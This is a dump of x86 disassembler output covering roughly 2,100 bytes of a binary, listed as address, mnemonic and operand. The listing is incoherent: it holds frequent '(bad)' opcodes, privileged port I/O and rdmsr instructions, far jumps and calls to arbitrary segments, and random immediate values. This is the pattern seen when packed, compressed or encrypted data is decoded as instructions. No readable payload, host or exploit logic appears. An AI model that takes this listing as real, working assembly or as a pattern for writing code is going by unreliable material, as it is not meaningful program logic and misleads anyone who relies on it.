  42224d:	fbstp  TBYTE PTR [ebx+0x21]
  422250:	push   es
  422251:	mov    eax,0xd3b30783
  422256:	std    
  422257:	(bad)  
  422258:	std    
  422259:	xor    DWORD PTR [edx-0x4eb26d48],ebx
  42225f:	ret    
  422260:	rcr    esi,0x2e
  422263:	les    ebp,FWORD PTR [ecx+0x4b]
  422266:	sub    bh,BYTE PTR [ebx+0x434947d5]
  42226c:	jmp    0x4222e8
  42226e:	aad    0x8c
  422270:	popa   
  422271:	inc    esi
  422272:	add    eax,0x43ed97d8
  422277:	addr16 imul ebx,esi,0xecb7001b
  42227e:	ins    DWORD PTR es:[edi],dx
  42227f:	add    al,0x4b
  422281:	(bad)  
  422282:	std    
  422283:	pop    ecx
  422284:	mov    al,ds:0x2f11979e
  422289:	inc    esp
  42228a:	xor    al,0xc8
  42228c:	cmp    ah,BYTE PTR [esi-0x44]
  42228f:	xchg   esi,eax
  422290:	add    edx,ecx
  422292:	shl    BYTE PTR [ecx+0x4b5605eb],cl
  422298:	arpl   WORD PTR [eax+edi*4-0x14203891],sp
  42229f:	lods   al,BYTE PTR ds:[esi]
  4222a0:	fmulp  st(1),st
  4222a2:	out    dx,eax
  4222a3:	test   eax,0xe7ab6077
  4222a8:	jmp    0x422284
  4222aa:	mov    ds:0xa6fb42a,al
  4222af:	jle    0x422257
  4222b1:	fimul  WORD PTR [esi+0x1b]
  4222b4:	cmp    eax,0xe1ab575c
  4222b9:	(bad)  
  4222ba:	mov    edx,0xa943eb47
  4222bf:	stos   BYTE PTR es:[edi],al
  4222c0:	adc    eax,0x3b6c9eca
  4222c5:	fisttp WORD PTR [esi+0x7d14866e]
  4222cb:	mov    ecx,0x4a9146d7
  4222d0:	jmp    0x4222fb
  4222d2:	sub    eax,0x69ec8c7c
  4222d7:	adc    eax,0x4e83df1a
  4222dc:	enter  0xfeb7,0x92
  4222e0:	out    dx,eax
  4222e1:	mov    bl,0xff
  4222e3:	loop   0x422344
  4222e5:	adc    BYTE PTR [eax+edi*1],dh
  4222e8:	adc    esp,DWORD PTR [eax+0x3d]
  4222eb:	scas   eax,DWORD PTR es:[edi]
  4222ec:	aad    0x22
  4222ee:	jmp    0x5aa834ba
  4222f3:	inc    ebp
  4222f4:	or     al,0xcb
  4222f6:	jne    0x4222ad
  4222f8:	jmp    0x4222bc
  4222fa:	sbb    dl,dh
  4222fc:	retf   0x644a
  4222ff:	test   al,0x19
  422301:	fild   QWORD PTR [edx+0x44161c1b]
  422307:	clc    
  422308:	je     0x42232c
  42230a:	std    
  42230b:	cmc    
  42230c:	ins    BYTE PTR es:[edi],dx
  42230d:	or     BYTE PTR [edx+0x78],0x40
  422311:	div    ch
  422313:	retf   0xe664
  422316:	push   DWORD PTR [edi]
  422318:	cmp    al,0x7f
  42231a:	test   DWORD PTR [edi+0x34],edx
  42231d:	cmc    
  42231e:	cld    
  42231f:	repz adc DWORD PTR [edx-0x57],ebx
  422323:	test   al,0x83
  422325:	fisub  WORD PTR [esi+0x3a3f66c8]
  42232b:	cmp    DWORD PTR [ebp-0x4f],edx
  42232e:	mov    dl,0xaa
  422330:	jmp    0x4222d5
  422332:	sbb    DWORD PTR [ebx+0x58],edi
  422335:	sbb    eax,0xdfd07ca8
  42233a:	out    dx,al
  42233b:	dec    edx
  42233c:	inc    esp
  42233d:	xchg   BYTE PTR [ecx-0x30924d7],ch
  422343:	cs ret 
  422345:	sbb    ebp,esi
  422347:	mov    WORD PTR [edi],gs
  422349:	ins    DWORD PTR es:[edi],dx
  42234a:	jns    0x422314
  42234c:	push   edi
  42234d:	popa   
  42234e:	lds    ebx,FWORD PTR [esi-0x79]
  422351:	adc    al,0x8c
  422353:	sub    ebx,0x64e0bfab
  422359:	cli    
  42235a:	sbb    eax,0xa34d3dae
  42235f:	enter  0x9da3,0x48
  422363:	add    DWORD PTR [eax-0x3b],esi
  422366:	push   ebx
  422367:	inc    esp
  422368:	jmp    0x42230f
  42236a:	rcr    DWORD PTR [edx],cl
  42236c:	fsubr  st(1),st
  42236e:	adc    eax,0x14df47e9
  422373:	push   eax
  422374:	inc    ebx
  422375:	out    0xcd,al
  422377:	pop    ds
  422378:	jnp    0x422303
  42237a:	hlt    
  42237b:	or     ch,al
  42237d:	push   ss
  42237e:	xchg   BYTE PTR [eax],ch
  422380:	xchg   BYTE PTR [ecx],bh
  422382:	mov    esi,DWORD PTR [eax-0x39]
  422385:	jmp    0x4223f2
  422387:	repnz pop di
  42238a:	and    DWORD PTR ds:0xbd4fff3,edi
  422390:	jmp    0x4223af
  422392:	pop    eax
  422393:	dec    edx
  422394:	sbb    esp,ebx
  422396:	and    edi,DWORD PTR [eax+0xebcdea7]
  42239c:	mov    edx,0x81575a7a
  4223a1:	sbb    DWORD PTR [ebp-0x709c381],edi
  4223a7:	mov    al,ss:0x6aaffff1
  4223ad:	fsincos 
  4223af:	xor    dh,BYTE PTR [ebp+0x27e12a7f]
  4223b5:	ffreep st(2)
  4223b7:	dec    edx
  4223b8:	sub    ebx,esi
  4223ba:	popa   
  4223bb:	mov    ebp,0xa7fd527a
  4223c0:	and    eax,0xa126d8cd
  4223c5:	jecxz  0x4223fb
  4223c7:	call   0xab1c:0xa2dedcd4
  4223ce:	addr16 jno 0x4223f4
  4223d1:	inc    esi
  4223d2:	mov    ch,0xb3
  4223d4:	jmp    0x4223e7
  4223d6:	(bad)  
  4223d7:	ds hlt 
  4223d9:	xor    DWORD PTR [edx-0x7520900f],esi
  4223df:	fdiv   DWORD PTR [esi+eiz*4]
  4223e2:	test   ecx,esp
  4223e4:	ffree  st(5)
  4223e6:	cld    
  4223e7:	cmp    eax,0x75785139
  4223ec:	jmp    0x57a8:0x78c820a5
  4223f3:	mov    al,0x88
  4223f5:	retf   0xa43b
  4223f8:	std    
  4223f9:	(bad)  
  4223fa:	mov    eax,DWORD PTR [esi-0x5fc33f42]
  422400:	push   edi
  422401:	ficom  WORD PTR [ebx+eiz*1-0x4d]
  422405:	loope  0x4223cd
  422407:	add    eax,0x4018fe03
  42240c:	jmp    0x422488
  42240e:	mov    WORD PTR [edi],fs
  422410:	xor    eax,0xafa01611
  422415:	loop   0x422463
  422417:	pushf  
  422418:	sti    
  422419:	jg     0x422470
  42241b:	cmp    BYTE PTR [eax-0x149c316d],bh
  422421:	push   ebp
  422422:	aaa    
  422423:	pop    eax
  422424:	retf   
  422425:	mov    ecx,0xbf2ecf7b
  42242a:	mov    ds:0xb9cad2fa,eax
  42242f:	inc    ebx
  422430:	in     eax,dx
  422431:	cmp    ch,BYTE PTR [ebx]
  422433:	dec    esp
  422434:	jns    0x422475
  422436:	repz add eax,0xc6d1aef6
  42243c:	pop    es
  42243d:	mov    BYTE PTR [edi-0x2f0074a5],bh
  422443:	xchg   ebp,eax
  422444:	ins    DWORD PTR es:[edi],dx
  422445:	(bad)  
  422446:	cld    
  422447:	push   ebp
  422448:	push   0xffffffc6
  42244a:	mov    edi,0x5f90a31
  42244f:	or     BYTE PTR [edi-0x369c4f50],ch
  422455:	mov    edi,0x1d5218fb
  42245a:	and    bl,dh
  42245c:	sti    
  42245d:	sub    DWORD PTR [ecx+ebp*4+0x142b0705],edi
  422464:	push   0x5d
  422466:	xor    bl,BYTE PTR [edi]
  422468:	aam    0xa8
  42246a:	mov    esp,0xfd8348d1
  42246f:	pop    edi
  422470:	push   es
  422471:	dec    esi
  422472:	idiv   DWORD PTR [edx-0xa]
  422475:	iret   
  422476:	rol    bh,1
  422478:	mov    ebx,0xb91c7214
  42247d:	sub    eax,DWORD PTR [esi-0x73]
  422480:	out    dx,al
  422481:	add    DWORD PTR ds:0x7c99729b,edx
  422487:	or     ch,cl
  422489:	cwde   
  42248a:	popf   
  42248b:	lahf   
  42248c:	jmp    0xfc56:0x406a28f3
  422493:	popa   
  422494:	add    eax,0x96b88740
  422499:	mov    esp,0x9e982b8b
  42249e:	scas   eax,DWORD PTR es:[edi]
  42249f:	fcom   st(2)
  4224a1:	aad    0xfd
  4224a3:	pushf  
  4224a4:	gs jbe 0x42249f
  4224a7:	cmc    
  4224a8:	inc    esi
  4224a9:	das    
  4224aa:	cdq    
  4224ab:	mov    ds:0x631adfd4,eax
  4224b0:	dec    DWORD PTR [edi]
  4224b2:	out    dx,al
  4224b3:	imul   ebp,DWORD PTR [edi-0x7e],0xffffffe1
  4224b7:	sbb    dh,BYTE PTR [eax+0x5c]
  4224ba:	sub    al,0x48
  4224bc:	jne    0x4224d6
  4224be:	out    0xfa,al
  4224c0:	push   ebp
  4224c1:	dec    edi
  4224c2:	push   edx
  4224c3:	mov    esi,0x8d41e004
  4224c8:	adc    eax,0xf75c9d6f
  4224cd:	and    eax,0x4d5836f6
  4224d2:	fmul   QWORD PTR [eax-0x45]
  4224d5:	fcmovne st,st(7)
  4224d7:	and    ecx,DWORD PTR [edi]
  4224d9:	mov    al,ds:0x2e2cc8ab
  4224de:	shr    BYTE PTR [edi+0x47],0x1a
  4224e2:	imul   ebx,DWORD PTR [ebp+0x7],0x6b68fcfb
  4224e9:	xor    esi,DWORD PTR [ecx-0x6d02619]
  4224ef:	mov    ebp,0x47ec272c
  4224f4:	retf   0x2220
  4224f7:	addr16 pop esi
  4224f9:	xchg   DWORD PTR [edi-0x1d0b1489],esp
  4224ff:	jp     0x422487
  422501:	push   ss
  422502:	cs lock scas eax,DWORD PTR es:[edi]
  422505:	(bad)  
  422507:	pop    ebp
  422508:	test   BYTE PTR [ecx+0x4283d2e7],0xfd
  42250f:	shr    DWORD PTR ds:0xf969bc47,1
  422515:	xor    eax,0xf4b0c9d9
  42251a:	out    0x5,eax
  42251c:	lock cwde 
  42251e:	pushf  
  42251f:	or     eax,ebx
  422521:	xchg   ebp,eax
  422522:	cld    
  422523:	out    dx,eax
  422524:	(bad)  
  422525:	loopne 0x42257d
  422527:	mov    al,0x44
  422529:	aaa    
  42252a:	mov    ds:0x1f7dfcc8,eax
  42252f:	fcmove st,st(2)
  422531:	stos   BYTE PTR es:[edi],al
  422532:	ja     0x4225af
  422534:	jmp    0x422514
  422536:	fmul   st(7),st
  422538:	sbb    DWORD PTR ds:0xdf970166,eax
  42253e:	mov    ebx,0xa5273ff
  422543:	inc    ebx
  422544:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422545:	cld    
  422546:	paddw  mm1,QWORD PTR cs:[ebx+0x37ea7a20]
  42254e:	lock retf 
  422550:	imul   ecx,DWORD PTR [edi-0x1a],0xffffffb6
  422554:	pop    esp
  422555:	push   ebx
  422556:	adc    BYTE PTR [ecx],dh
  422558:	and    edi,DWORD PTR [ecx]
  42255a:	(bad)
  42255d:	call   0x8865d21c
  422562:	aaa    
  422563:	(bad)  
  422564:	jmp    0x422574
  422566:	xor    al,0xe
  422568:	retf   0xe210
  42256b:	mov    bh,0x7f
  42256d:	fbld   TBYTE PTR ds:0xb7792b45
  422573:	test   eax,0x7ffd677a
  422578:	adc    dh,BYTE PTR [edi+edi*4-0x539517fb]
  42257f:	enter  0x3f50,0x56
  422583:	ficomp WORD PTR [ecx-0x25]
  422586:	sbb    DWORD PTR [edi+0x26b1e3eb],edx
  42258c:	fist   WORD PTR [ebp+0x47fa9037]
  422592:	out    dx,al
  422593:	(bad)  
  422594:	jecxz  0x42255b
  422596:	stc    
  422597:	test   eax,0xcc50c941
  42259c:	in     al,dx
  42259d:	dec    ebp
  42259e:	mov    ebx,0xdbfa6e70
  4225a3:	fnstsw WORD PTR [edx]
  4225a5:	inc    edi
  4225a6:	push   cs
  4225a7:	xchg   ebx,eax
  4225a8:	add    cl,cl
  4225aa:	and    ecx,ebx
  4225ac:	mov    ebx,0xa5ac098f
  4225b1:	scas   al,BYTE PTR es:[edi]
  4225b2:	xchg   edi,eax
  4225b3:	push   0x23
  4225b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4225b6:	mov    dh,0x94
  4225b8:	in     al,dx
  4225b9:	ror    BYTE PTR [edi],1
  4225bb:	jmp    0x1a622679
  4225c0:	pop    es
  4225c1:	pushf  
  4225c2:	in     eax,dx
  4225c3:	out    0x6c,al
  4225c5:	xor    al,0xad
  4225c7:	and    eax,0x943990eb
  4225cc:	loope  0x4225f7
  4225ce:	pop    ecx
  4225cf:	fsubr  QWORD PTR [esi-0x2d]
  4225d2:	repnz (bad) 
  4225d4:	mov    bh,BYTE PTR [ebx-0x7e]
  4225d7:	pop    edi
  4225d8:	aas    
  4225d9:	mov    dh,0x22
  4225db:	int    0xeb
  4225dd:	add    BYTE PTR [edi+0x3438be18],0xc
  4225e4:	cmp    eax,esp
  4225e6:	cwde   
  4225e7:	xchg   ebx,eax
  4225e8:	icebp  
  4225e9:	daa    
  4225ea:	test   DWORD PTR [eax+0x66599a78],ebx
  4225f0:	jmp    0x42258f
  4225f2:	cdq    
  4225f3:	or     eax,0xd8cebe69
  4225f8:	push   edi
  4225f9:	fist   WORD PTR [esi+0x35af621e]
  4225ff:	clc    
  422600:	inc    edx
  422601:	cli    
  422602:	cld    
  422603:	or     cl,cl
  422605:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422606:	sub    ebx,ebp
  422608:	ror    BYTE PTR [ebp-0x4e],cl
  42260b:	enter  0xa89a,0x49
  42260f:	sbb    DWORD PTR [eax+0xe],0x9eecd286
  422616:	push   ds
  422617:	jae    0x4225e6
  422619:	into   
  42261a:	out    0xca,eax
  42261c:	fld    TBYTE PTR [ebp+0x74]
  42261f:	enter  0x61fa,0xf5
  422623:	nop
  422624:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422625:	cmp    BYTE PTR [ebp+0x47],ch
  422628:	jmp    0x4225ad
  42262a:	mov    DWORD PTR [ebx+esi*2-0x5effccc3],ebp
  422631:	fist   WORD PTR [esi]
  422633:	mov    dh,0xfa
  422635:	out    0x6a,al
  422637:	addr16 fmul st(0),st
  42263a:	cld    
  42263b:	les    esi,FWORD PTR [eax+eax*1-0x70636ac0]
  422642:	xchg   ecx,eax
  422643:	enter  0x41ec,0x75
  422647:	xchg   edi,eax
  422648:	push   edx
  422649:	dec    ecx
  42264a:	jnp    0x42261a
  42264c:	jmp    0x42269e
  42264e:	call   0x13d1:0x726e1cf9
  422655:	(bad)  
  422657:	fsubr  DWORD PTR [esi+esi*1]
  42265a:	in     al,0x78
  42265c:	xor    esi,ebp
  42265e:	adc    DWORD PTR [ebx-0x1d],0xffffffa4
  422662:	test   edi,0xedc9674c
  422668:	fimul  DWORD PTR [edx+0xf]
  42266b:	enter  0xc51e,0xb0
  42266f:	iret   
  422670:	sub    eax,0xeb4d9d40
  422675:	mov    al,ds:0x73084223
  42267a:	jle    0x422625
  42267c:	sub    ebx,esp
  42267e:	xor    al,0x95
  422680:	add    esp,DWORD PTR [ecx]
  422682:	jne    0x4226cc
  422684:	cmp    DWORD PTR [esi+eax*8],esp
  422687:	imul   ebx
  422689:	fnsave [esi-0x34]
  42268c:	shr    DWORD PTR [ebx-0x4c],1
  42268f:	ins    BYTE PTR es:[edi],dx
  422690:	sbb    eax,0x153dc9df
  422695:	test   al,0x61
  422697:	mov    DWORD PTR [edx+0x1a],0x65d346fc
  42269e:	jmpw   0x12cd
  4226a2:	mov    WORD PTR [edx],ds
  4226a4:	add    ah,al
  4226a6:	cmp    ebx,DWORD PTR [ecx-0x27]
  4226a9:	in     eax,0xa0
  4226ab:	in     eax,0xd4
  4226ad:	and    ch,BYTE PTR [ebp-0xb]
  4226b0:	out    dx,eax
  4226b1:	ret    0x6ea9
  4226b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226b5:	adc    ecx,0x4d3bca93
  4226bb:	les    edi,FWORD PTR [eax+0x69e9f6d6]
  4226c1:	pop    ds
  4226c2:	adc    eax,0xfd1c4b46
  4226c7:	mov    edx,0x856fc817
  4226cc:	or     al,0x43
  4226ce:	or     al,0xa5
  4226d1:	test   bl,cl
  4226d3:	xchg   esp,eax
  4226d4:	inc    ebp
  4226d5:	cmp    al,0xb4
  4226d7:	jp     0x4226c4
  4226d9:	mov    esp,0xe36ea529
  4226de:	imul   eax,DWORD PTR [edx],0x26
  4226e1:	fst    QWORD PTR [ebx+0x25]
  4226e4:	les    edx,FWORD PTR [eax+edx*2+0xb9f185c]
  4226eb:	rep stos BYTE PTR es:[edi],al
  4226ed:	ffreep st(7)
  4226ef:	adc    bh,ch
  4226f1:	sub    eax,0x967945ac
  4226f6:	cld    
  4226f7:	push   ds
  4226f8:	adc    ah,BYTE PTR [edi-0x3e]
  4226fb:	mov    ch,0xac
  4226fd:	dec    esi
  4226fe:	mov    eax,cs
  422700:	sbb    eax,0xe3ef39f6
  422705:	pop    ss
  422706:	sar    BYTE PTR [eax+0x3dbe22eb],0xae
  42270d:	ja     0x422725
  42270f:	das    
  422710:	lds    ecx,FWORD PTR [edi-0x2b]
  422713:	mov    ebx,0x885d5018
  422718:	int    0x48
  42271a:	mov    bh,0xd3
  42271c:	pop    es
  42271d:	js     0x42271e
  42271f:	and    edi,ebx
  422721:	fcmovnu st,st(0)
  422723:	sub    bh,BYTE PTR [esi-0x3af50f41]
  422729:	fisttp WORD PTR [esi]
  42272b:	ret    0xa181
  42272e:	call   0xd635:0xffc09ead
  422735:	aaa    
  422736:	fs jbe 0x42273d
  422739:	dec    eax
  42273a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42273b:	(bad)  
  42273c:	fwait
  42273d:	aam    0xb7
  42273f:	aad    0x34
  422741:	pop    es
  422742:	jge    0x4227aa
  422744:	repnz sub BYTE PTR [ebp-0x280f815],bh
  42274b:	cmp    BYTE PTR [edx+0x1bf8ab54],al
  422751:	(bad)  
  422752:	repz (bad) 
  422754:	xchg   ebx,eax
  422755:	addr16 pop ss
  422757:	jg     0x422708
  422759:	ins    DWORD PTR es:[edi],dx
  42275a:	push   esi
  42275b:	and    eax,0xc6bf35e7
  422760:	aad    0x4e
  422762:	mov    ebp,0x44e9b1de
  422767:	(bad)  
  422768:	jg     0x422727
  42276a:	push   ecx
  42276b:	mov    DWORD PTR [esi+0x51ecd53e],esi
  422771:	aas    
  422772:	pop    edx
  422773:	inc    esi
  422774:	jmp    0x4227ab
  422776:	push   esi
  422777:	mov    WORD PTR [edx+ebx*4+0x7],es
  42277b:	pop    es
  42277c:	adc    esp,eax
  42277e:	std    
  42277f:	xchg   edi,esi
  422781:	stc    
  422782:	adc    cl,BYTE PTR [ebx+0x616cef3e]
  422788:	popa   
  422789:	pop    esp
  42278a:	std    
  42278b:	sbb    BYTE PTR [ebp+0x5b3dc269],0x80
  422792:	xor    al,bh
  422794:	in     eax,dx
  422795:	xor    eax,0x3dcaa
  42279a:	daa    
  42279b:	ror    DWORD PTR [eax-0x44],cl
  42279e:	clc    
  42279f:	sub    DWORD PTR [edi],esp
  4227a1:	ret    
  4227a2:	dec    ebx
  4227a3:	jmp    0xdff5:0x7533aa6b
  4227aa:	aam    0xdf
  4227ac:	xchg   esi,eax
  4227ad:	cmp    DWORD PTR [ebx-0x1ba9d2ab],0x9e5c5ada
  4227b7:	pop    ss
  4227b8:	pop    ebp
  4227b9:	mov    al,ds:0xb675207f
  4227be:	pop    esp
  4227bf:	enter  0x2014,0x66
  4227c3:	jne    0x42283d
  4227c5:	js     0x422808
  4227c7:	inc    esp
  4227c8:	loope  0x422798
  4227ca:	std    
  4227cb:	(bad)  
  4227cc:	leave  
  4227cd:	jbe    0x4227db
  4227cf:	imul   ebp,ebp,0xf4e2e1b5
  4227d5:	in     al,0xfc
  4227d7:	mov    bl,ch
  4227d9:	das    
  4227da:	test   DWORD PTR [eax+ecx*4-0x39],ebx
  4227de:	cld    
  4227df:	(bad)  
  4227e0:	dec    edx
  4227e1:	inc    esi
  4227e2:	sbb    esp,ebp
  4227e4:	push   esp
  4227e5:	mov    bl,0xd7
  4227e7:	adc    esp,DWORD PTR [ecx+0x64c804c4]
  4227ed:	adc    al,0x17
  4227ef:	add    DWORD PTR [esi-0x19cce678],edi
  4227f5:	data16 out dx,al
  4227f7:	int    0xe2
  4227f9:	jae    0x4227a8
  4227fb:	push   ds
  4227fc:	xor    ah,bh
  4227fe:	sub    eax,ecx
  422800:	jmp    0xce61:0x9664c225
  422807:	pop    es
  422808:	jmp    0x4227fe
  42280a:	mov    ecx,0x28c8ded0
  42280f:	(bad)  [ecx]
  422811:	fcomp  QWORD PTR [edi+eiz*2]
  422814:	mov    BYTE PTR [edx+ebp*2],bl
  422817:	mov    bh,0x73
  422819:	dec    ebx
  42281a:	inc    esi
  42281b:	(bad)
  42281f:	(bad)  
  422820:	repz mov esi,0xb1e4ca46
  422826:	sub    al,cl
  422828:	adc    al,0x90
  42282a:	in     eax,0x69
  42282c:	fucomip st,st(2)
  42282e:	or     ebx,ebx
  422830:	cdq    
  422831:	sbb    esi,esi
  422833:	adc    ebp,esi
  422835:	and    dh,BYTE PTR [ebx]
  422837:	xchg   edi,eax
  422838:	imul   ebp,DWORD PTR [eax],0xffffffd3
  42283b:	sbb    ebx,ebp
  42283d:	mov    al,ds:0x5e0874fc
  422842:	mov    eax,0xaf6be0fd
  422847:	mov    edi,0xc7e677c0
  42284c:	jo     0x4228a0
  42284e:	ss mov bl,0xba
  422851:	or     eax,0x42fb43ff
  422856:	mov    al,ds:0x389f761b
  42285b:	rcr    DWORD PTR [edi-0x17],1
  42285e:	(bad)  
  42285f:	jne    0x4228a4
  422861:	in     eax,dx
  422862:	dec    ebx
  422863:	sar    DWORD PTR [ebp-0x1b],cl
  422866:	(bad)  
  422867:	jae    0x422862
  422869:	addr16 mov al,ds:0x5b87
  42286d:	pop    es
  42286e:	mov    edi,0x190eebed
  422873:	lods   eax,DWORD PTR ds:[esi]
  422874:	popa   
  422875:	xor    al,0x9c
  422877:	popa   
  422878:	pop    edi
  422879:	(bad)  
  42287a:	ja     0x422807
  42287c:	mov    esp,0x2166fc94
  422881:	test   eax,0x511f23f9
  422886:	std    
  422887:	aam    0x3b
  422889:	dec    esp
  42288a:	loope  0x4228cf
  42288c:	fs cmp bl,cl
  42288f:	fidiv  WORD PTR [ebx-0xa88835f]
  422895:	in     eax,0x1e
  422897:	adc    bl,bl
  422899:	mov    ds:0x4efefc23,eax
  42289e:	cmp    al,0x38
  4228a0:	imul   ecx,DWORD PTR [eiz*1+0xc244a7f],0xffffffc8
  4228a8:	aaa    
  4228a9:	rcl    esi,0xd0
  4228ac:	lea    esi,[eax+0x67fe160d]
  4228b2:	add    BYTE PTR [ebx+ebp*4+0x399fbe66],dh
  4228b9:	adc    BYTE PTR [edi],ah
  4228bb:	mov    esi,0x9db6d666
  4228c0:	imul   eax,edx,0x29
  4228c3:	sbb    BYTE PTR [edx+0x7f],bh
  4228c6:	jb     0x4228d3
  4228c8:	jmp    0xb688:0x3ea747fb
  4228cf:	cmp    BYTE PTR [eax+0x62c8945d],ah
  4228d5:	jb     0x422954
  4228d7:	lds    ebx,FWORD PTR [edi-0x14c9e4c5]
  4228dd:	daa    
  4228de:	add    DWORD PTR [esi+eiz*4+0x4a],0xfffffff8
  4228e3:	aam    0x3f
  4228e5:	cmp    eax,0x184fc804
  4228ea:	mov    ebx,0x1511d19e
  4228ef:	sub    ch,bl
  4228f1:	sbb    eax,DWORD PTR ds:0xa7de9177
  4228f7:	inc    esi
  4228f8:	fist   WORD PTR [edx]
  4228fb:	retf   0x96f4
  4228fe:	jae    0x422974
  422900:	push   es
  422901:	cli    
  422902:	add    al,0xe6
  422904:	(bad)  
  422905:	js     0x4228ac
  422907:	and    al,0xdf
  422909:	stc    
  42290a:	test   eax,0x85dfa363
  42290f:	jb     0x42293b
  422911:	mov    eax,0xd1eb9b8d
  422916:	push   ebx
  422917:	mov    ecx,DWORD PTR [ebp+0x34]
  42291a:	jge    0x4228dd
  42291c:	mov    esi,0x914a6adf
  422921:	mov    bh,0x28
  422923:	pop    edi
  422924:	sbb    esi,DWORD PTR [ecx-0x2]
  422927:	in     al,0x5d
  422929:	ss dec ebp
  42292b:	dec    ebx
  42292c:	repz out 0xa4,al
  42292f:	lods   eax,DWORD PTR ds:[esi]
  422930:	aas    
  422931:	fistp  WORD PTR [ebp-0x64]
  422934:	or     dh,BYTE PTR [edx+0x11bf0a2f]
  42293a:	std    
  42293b:	mov    dl,0xe4
  42293d:	push   0x48be868c
  422942:	lea    ebp,[edi+ecx*2]
  422945:	fbstp  TBYTE PTR [esp+eiz*4-0x28]
  422949:	mov    dl,0x85
  42294b:	mov    cl,0x98
  42294d:	inc    esp
  42294e:	std    
  42294f:	mov    eax,0xbdf194ca
  422954:	mov    ds:0x4e9b76a7,eax
  422959:	fbld   TBYTE PTR [edx+0x41d6cedd]
  42295f:	mov    edx,DWORD PTR [ebp+0x32d6fd72]
  422965:	sbb    al,0xcd
  422967:	or     BYTE PTR [eax],ah
  422969:	rcr    DWORD PTR [edx],cl
  42296b:	retf   
  42296c:	jecxz  0x4229c3
  42296e:	cli    
  42296f:	pop    ebx
  422970:	fdiv   QWORD PTR [edx+0x59464164]
  422976:	std    
  422977:	lods   eax,DWORD PTR ds:[esi]
  422978:	cwde   
  422979:	stc    
  42297a:	lock jno 0x4229ae
  42297d:	push   ebx
  42297e:	ja     0x42291d
  422980:	(bad)  
  422981:	fild   QWORD PTR [edx]
  422983:	cmp    dh,BYTE PTR [eax+0x5d534ab8]
  422989:	outs   dx,DWORD PTR ds:[esi]
  42298a:	std    
  42298b:	and    BYTE PTR [eax+0x23],0x54
  42298f:	inc    edx
  422990:	pop    es
  422991:	add    esi,DWORD PTR [eax]
  422993:	xlat   BYTE PTR ds:[ebx]
  422994:	dec    ebx
  422995:	pop    esi
  422996:	lea    ebp,[edi-0x520e43b4]
  42299c:	cdq    
  42299d:	mov    edi,0xa2eb3cae
  4229a2:	push   esp
  4229a3:	mov    WORD PTR [ebp+eiz*2-0x20997259],?
  4229aa:	js     0x422947
  4229ac:	jae    0x422953
  4229ae:	in     al,dx
  4229af:	jnp    0x4229dc
  4229b1:	stos   BYTE PTR es:[edi],al
  4229b2:	out    0x95,eax
  4229b4:	pop    esp
  4229b5:	pop    edi
  4229b6:	sbb    al,BYTE PTR [edx]
  4229b8:	mov    dh,0x9c
  4229ba:	add    eax,0x25df761c
  4229bf:	addr16 xchg edi,eax
  4229c1:	add    esi,ecx
  4229c3:	dec    esi
  4229c4:	fs cmc 
  4229c6:	rdmsr  
  4229c8:	fdiv   QWORD PTR [ebp-0x2]
  4229cb:	sbb    BYTE PTR [esi+0x1b2c94a9],dh
  4229d1:	and    BYTE PTR [ebp-0x38],bh
  4229d4:	(bad)  
  4229d5:	in     al,0xe3
  4229d7:	(bad)  [ecx-0x1731e166]
  4229dd:	xchg   ebx,eax
  4229de:	jns    0x422985
  4229e0:	inc    edx
  4229e1:	sti    
  4229e2:	mov    esp,0xc386d939
  4229e7:	enter  0x3a0d,0x3c
  4229eb:	dec    edx
  4229ec:	pushf  
  4229ed:	loope  0x422a58
  4229ef:	jmp    0x562aa38d
  4229f4:	ret    0x39dc
  4229f7:	add    al,0xf0
  4229f9:	or     BYTE PTR [edi],bh
  4229fb:	xor    BYTE PTR [ebx+0x5fe0b6ea],dh
  422a01:	add    al,0x63
  422a03:	jno    0x4229a5
  422a05:	scas   eax,DWORD PTR es:[edi]
  422a06:	and    BYTE PTR [eax+0x18],ah
  422a09:	fcomip st,st(6)
  422a0b:	mov    esp,DWORD PTR [eax+0x38]
  422a0e:	add    DWORD PTR [edi+0x61fd18be],esp
  422a14:	unpcklps xmm1,XMMWORD PTR [esp+esi*2-0x41]
  422a19:	mov    edi,DWORD PTR [edi+0x7c3df0cb]
  422a1f:	add    ah,dh
  422a21:	fisttp QWORD PTR [ecx+esi*1+0x1efc9972]
  422a28:	push   esp
  422a29:	shr    DWORD PTR [eax],0xb6
  422a2c:	les    eax,FWORD PTR [ebp-0x7e63778]
  422a32:	fistp  DWORD PTR [esi+0x68f4409b]
  422a38:	and    esi,eax
  422a3a:	inc    DWORD PTR [edi+0x25]
  422a3d:	cdq    
  422a3e:	xchg   ecx,eax
  422a3f:	adc    bh,dh
  422a41:	outs   dx,BYTE PTR ds:[esi]
  422a42:	xchg   ebp,eax
  422a43:	xchg   ebp,eax
  422a44:	fstp   TBYTE PTR [esi+0x2c3dc8a9]
  422a4a:	(bad)  
  422a4b:	mov    ch,0x11
  422a4d:	add    bh,bl
  422a4f:	adc    ebp,ebx
  422a51:	(bad)  
  422a52:	sbb    ecx,DWORD PTR [eax]
  422a54:	push   es
  422a55:	ror    ebx,cl
  422a57:	lods   eax,DWORD PTR ds:[esi]
  422a58:	mov    esp,0x263aced6
  422a5d:	cmp    eax,0x8d20d0fd
  422a62:	sbb    eax,0x3a49eb9e
  422a67:	rol    DWORD PTR [edi+0x6412078a],0xdd
  422a6e:	xor    eax,0xedcb42bf
  422a73:	call   0xe01b:0x682eb20b
  422a7a:	cld    
  422a7b:	mov    ds:0x8d751ae9,al
  422a80:	popf   
  422a81:	mov    al,0xc4
  422a83:	enter  0xf189,0x5
  422a87:	lods   al,BYTE PTR ds:[esi]
  422a88:	mov    ebx,0xe2d4a285
  422a8d:	std    
  422a8e:	pop    es
  422a8f:	enter  0x753f,0x5a
  422a93:	(bad)  
  422a95:	jo     0x422a17
  422a97:	enter  0x9f13,0x25
  422a9b:	or     eax,0x8341d5c3
  422aa0:	cdq    
  422aa1:	push   ebp
  422aa2:	std    
  422aa3:	aad    0x77
  422aa5:	in     eax,dx
  422aa6:	xchg   esi,eax
  422aa7:	inc    ebx
  422aa8:	pop    eax
  422aa9:	and    al,0x96
  422aab:	into   
  422aac:	xchg   edi,eax
  422aad:	jo     0x422aad
  422aaf:	add    DWORD PTR [edx+edi*1-0x59],ebp
  422ab3:	ror    BYTE PTR [edx+0x27],1
